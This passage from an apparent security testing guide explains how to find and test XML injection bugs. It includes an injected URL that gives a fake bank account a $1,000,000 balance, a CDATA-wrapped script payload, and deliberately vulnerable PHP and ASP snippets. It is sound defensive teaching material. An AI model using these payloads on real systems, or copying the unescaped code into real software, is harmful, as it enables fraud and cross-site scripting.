&lt;pre&gt;&amp;lt;/user&amp;gt;&lt;/pre&gt;
&lt;p&gt;The bank doesn’t provide a web interface to create saving accounts.&amp;nbsp; In order to open a saving account, clients need to go to the bank and provide additional information.&amp;nbsp; The bank exposes a security vulnerability that allows the attacker to feed malicious
 data in the web form.&amp;nbsp; The attacker submits the following URL request:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;http://www.examplesite.com/CreateChecking.php?username=JohnyC&amp;amp;password=qwerty&amp;amp;email=JohnyC@examplesite.com&amp;lt;/mail&amp;gt;&amp;lt;account type=&amp;quot;savings&amp;quot;&amp;gt;&amp;lt;created&amp;gt;03-02-2008&amp;lt;/created&amp;gt;&amp;lt;number&amp;gt;12345678&amp;lt;/number&amp;gt;&amp;lt;balance&amp;gt;1000000&amp;lt;/balance&amp;gt;&amp;lt;/account&amp;gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;When the bank receives this request it doesn’t check for extra tags and builds the following element in its data store:&lt;/p&gt;
&lt;pre&gt;&amp;lt;user&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;username&amp;gt;JohnyC&amp;lt;/username&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password&amp;gt;qwerty&amp;lt;/password&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;userid&amp;gt;111&amp;lt;userid/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;mail&amp;gt;JohnyC@examplesite.com&amp;lt;/mail&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;account type=&amp;quot;savings&amp;quot;&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;created&amp;gt;03-02-2008&amp;lt;/created&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;number&amp;gt;12345678&amp;lt;/number&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;balance&amp;gt;1000000&amp;lt;/balance&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/account&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;account type=”checking”&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;created&amp;gt;02-21-2008&amp;lt;/created&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;number&amp;gt;1249109&amp;lt;/number&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;balance&amp;gt;1201&amp;lt;/balance&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/account&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;lt;/user&amp;gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;The bug in the bank web application here allows the attacker to remotely create a savings account with a $1000000 balance.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Scenario 2:&amp;nbsp; Executing cross-site scripting attacks by manipulating the CDATA tag
&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;XML uses the CDATA tag to escape blocks of text that would be otherwise recognized as markup.&amp;nbsp; All data enclosed in between the tags
&lt;strong&gt;&amp;quot;&amp;lt;![CDATA[&amp;quot; &lt;/strong&gt;and &lt;strong&gt;&amp;quot;]]&amp;gt;&amp;quot; &lt;/strong&gt;will not be parsed as markup.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;A vulnerable server uses a file named scenarios.xml to store the title and the data for each scenario:&lt;/p&gt;
&lt;pre&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;scenarios&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;scenario&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;title&amp;gt;XSS scenario&amp;lt;/title&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;data&amp;gt;&amp;lt;![CDATA[this is not to be parsed &amp;lt;!-- as XML '&amp;quot;&amp;gt;&amp;lt;]]&amp;gt;&amp;lt;/data&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/scenario&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;etc…&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/scenarios&amp;gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The application blindly builds a page (scenarios.php) from the XML file using the following code and then sends the page back to the client:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&amp;lt;? php&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; $objDOM = new DOMDocument(); &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; $objDOM-&amp;gt;load(&amp;quot;scenarios.xml&amp;quot;); &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; $scenario = $objDOM-&amp;gt;getElementsByTagName(&amp;quot;scenario&amp;quot;);&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; foreach( $scenario as $value )&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; {&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; $title&amp;nbsp; = $value-&amp;gt;getElementsByTagName(&amp;quot;title&amp;quot;)-&amp;gt;item(0)-&amp;gt;nodeValue;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; $data =&amp;nbsp;&amp;nbsp; $value-&amp;gt;getElementsByTagName(&amp;quot;data&amp;quot;)-&amp;gt;item(0)-&amp;gt;nodeValue;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; echo &amp;quot;$title:&amp;lt;br&amp;gt;$data&amp;lt;br&amp;gt;&amp;quot;;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; }&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; &lt;/pre&gt;
&lt;pre&gt;?&amp;gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The scenario above will generate the following output:&lt;/p&gt;
&lt;pre&gt;XSS scenario:&lt;br&gt;this is not be parsed as XML '&amp;quot;&amp;gt;&amp;lt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Now the attacker gets control of scenarios.xml and modifies the data tag to look like this:&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&amp;lt;scenario&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;title&amp;gt;XSS scenario&amp;lt;/title&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;data&amp;gt;&amp;lt;![CDATA[&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;]]&amp;gt;&amp;lt;/data&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/scenario&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;This will result in the vulnerable application building a page similar to the one below and sending it to the client:&lt;/p&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;XSS scenario:&lt;/pre&gt;
&lt;pre&gt;&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;That finally results in a cross-site scripting attack because the server doesn’t validate the XML output before sending it back as HTML to the client.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 2:&amp;nbsp; Identify high risk components&lt;/h1&gt;
&lt;p&gt;The next steps for XML Injection testing are to list all of the places where code builds XML statements from user supplied input; and to understand how and where our application manipulates statements, and how it uses them to modify its data store or to
 invoke XML web methods.&amp;nbsp; The most common are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Profile-related web pages. &lt;/li&gt;&lt;li&gt;E-Commerce or financial account-related pages. &lt;/li&gt;&lt;li&gt;XML web service interaction methods. &lt;/li&gt;&lt;li&gt;XML-based system-level clients. &lt;/li&gt;&lt;li&gt;Systems that read from XML backend and blindly construct responses to Internet clients.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Identify all high risk components &lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;This subtask consists of indentifying the coding errors that lead to XML injection bugs.&amp;nbsp; XML injection bugs exist for two main reasons.&amp;nbsp; First, when a server-side application directly utilizes user-supplied strings that arrive over the Internet to add into
 their XML data store or perform other XML-related tasks.&amp;nbsp; The application doesn’t do any sort of data validation on the strings, and therefore allows for injection of XML tags.&amp;nbsp; In the second case, an application is vulnerable if it reads from an XML store
 and blindly constructs an HTML page to send back to the client.&lt;/p&gt;
&lt;p&gt;During this subtask, you need to go through all web pages in the application under test and look for any XML interaction.&amp;nbsp; Any page or method that uses XML to transmit data must be listed as a high risk component.&amp;nbsp;&amp;nbsp; Following are some common examples of
 what you need to look for when reviewing code for XML injection bugs.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Identify the usage of XML parsers&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Server-side applications can choose from a wide variety of XML parsers depending on the language they are written (ASP, PHP, Java, etc.)&amp;nbsp; It is important that you recognize if the application you’re testing uses any of these parsers.&amp;nbsp; If so, it is a clear
 indication that the application manipulates XML.&amp;nbsp; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SAXParser (Java) &lt;/li&gt;&lt;li&gt;MSXML (including Microsoft XML DOM Parser) &lt;/li&gt;&lt;li&gt;Xerces (Java, C&amp;#43;&amp;#43;, Perl) &lt;/li&gt;&lt;li&gt;Oracle XML Parser &lt;/li&gt;&lt;li&gt;XML Booster &lt;/li&gt;&lt;li&gt;XML::Parser (form Perl) &lt;/li&gt;&lt;li&gt;XParse&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;This short list illustrates that the programmer has different choices when selecting an XML parser.&amp;nbsp; Make sure to look for the presence of any of these.&amp;nbsp; In addition, keep up with the latest XML parsing technology and research for additional parsers that
 your application might use.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Look for code that writes XML from user-supplied input&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Any code that uses user-supplied input (from web forms, URLs, etc) must be marked as high risk.&amp;nbsp; Below is an example that uses the input parameter from a URL to construct XML:&lt;/p&gt;
&lt;pre&gt;set xmlDoc=CreateObject(&amp;quot;Microsoft.XMLDOM&amp;quot;)&lt;/pre&gt;
&lt;pre&gt;xmlDoc.async=&amp;quot;false&amp;quot;&lt;/pre&gt;
&lt;pre&gt;xmlDoc.load(&amp;quot;accounts.xml&amp;quot;)&amp;nbsp;&lt;/pre&gt;
&lt;pre&gt;for each x in xmlDoc.documentElement.childNodes&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; document.write(x.nodename)&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; document.write(&amp;quot;: &amp;quot;)&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; document.write(x.text)&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; document.write(Request.QueryString(&amp;quot;input&amp;quot;))&lt;/pre&gt;
&lt;pre&gt;next&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Detect applications that use the CDATA tag&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Look at both the application code and storage XML files to identify the usage of the CDATA tag.&amp;nbsp; Identifying CDATA tags inside XML documents is easy.&amp;nbsp; Just search the contents of all XML documents in your application looking for the string “CDATA”.&amp;nbsp; Then
 track down the code that uses the data read from this kind of tag.&amp;nbsp; Any component that directly writes the contents of CDATA tags to an HTML response is vulnerable to cross-site scripting attacks through XML injection:&lt;/p&gt;
&lt;pre&gt;Response.Write(contents from CDATA tag)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (ASP)&lt;/pre&gt;
&lt;pre&gt;echo contents from CDATA tag;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (PHP)&lt;/pre&gt;
&lt;pre&gt;print contents from CDATA tag;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (PHP)&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Don’t rely on XML Document Type Definitions (DTDs)&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Programmers might assume that defining XML tags using DTD&lt;a href="about:blank#_edn3" name="x__ednref3"&gt;[iii]&lt;/a&gt; protects them against XML injection attacks.&amp;nbsp; As we will see later on, this is a misconception.&amp;nbsp; Include any document that handles XML (using
 DTD or not) as a high risk component. &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Match High Risk Components with Entry Points&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Non-validated XML data can come from any application entry point.&amp;nbsp; Make sure to cover all the possible sources of malicious data which might get passed to a client.&amp;nbsp; Common data sources include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web forms &lt;/li&gt;&lt;li&gt;URL contents &lt;/li&gt;&lt;li&gt;Flash parameters &lt;/li&gt;&lt;li&gt;XML store contents &lt;/li&gt;&lt;li&gt;Web service data &lt;/li&gt;&lt;li&gt;Graphical User Interface&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;List the high risk application components (usually web pages such as the ones in the scenarios above) and their related entry points to systematically aid with your testing:
&lt;/p&gt;
&lt;p&gt;&lt;br&gt;
&lt;br&gt;
&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Component&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Line&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;URL&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Form&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Flash&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;DB&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Service&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;CreateChecking.php&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;101&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;112&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;165&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Response.php&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;1001&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;1116&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Present.php&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;234&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;531&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;showAccount.php&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;432&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;X&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 3:&amp;nbsp; Start Testing and Exploring&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/h1&gt;
&lt;p&gt;This step of testing is focused on submitting basic XML injection fuzz strings and observing how the application reacts.&amp;nbsp; Then, we will try to execute two simple XML injection attacks as shown in the previous scenarios:&amp;nbsp; tag injection and CDATA XSS.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;Try all of the tests in this step through the easiest entry point for each high risk component.&amp;nbsp; In step 4 you will tune your test case data to cover the different formats and encoding depending on the remaining entry points.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Start with simple fuzz strings&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Successful XML injection testing depends on whether the tester is able to send XML data that will end up being processed as expected XML.
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Closing quotes and tag characters&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;It is recommend that you start testing with a simple XML string consisting of a single quote, a closing tag character, an opening tag character and a double quote.&amp;nbsp; Try these four characters separately and combined:&lt;/p&gt;
&lt;p&gt;'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (separately)&lt;/p&gt;
&lt;p&gt;or&amp;nbsp; &lt;/p&gt;
